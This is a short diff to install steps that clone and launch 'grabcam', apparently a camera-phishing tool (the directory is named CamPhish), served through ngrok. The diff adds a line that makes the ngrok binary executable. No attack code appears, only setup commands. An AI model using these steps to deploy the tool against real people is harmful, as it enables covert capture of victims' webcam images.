@@ -9,5 +9,6 @@ git clone https://github.com/noob-hackers/grabcam
 ls
 unzip ngrok.zip
 cp ngrok $HOME/CamPhish/grabcam
+chmod +x ngrok
 cd grabcam
 bash grabcam.sh
